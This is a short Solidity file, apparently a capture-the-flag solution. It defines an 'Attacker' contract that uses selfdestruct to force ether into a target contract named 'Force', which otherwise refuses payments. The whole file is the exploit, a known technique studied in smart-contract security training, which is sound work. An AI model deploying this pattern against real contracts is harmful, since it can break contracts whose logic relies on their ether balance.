// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attacker {
    address payable force;

    constructor(address _force) {
        force = payable(_force);
    }

    // The only way to force Force to receive ether is by using selfdestruct
    function selfDestructAttack() public {
        selfdestruct(force);
    }

    receive() external payable {}
}

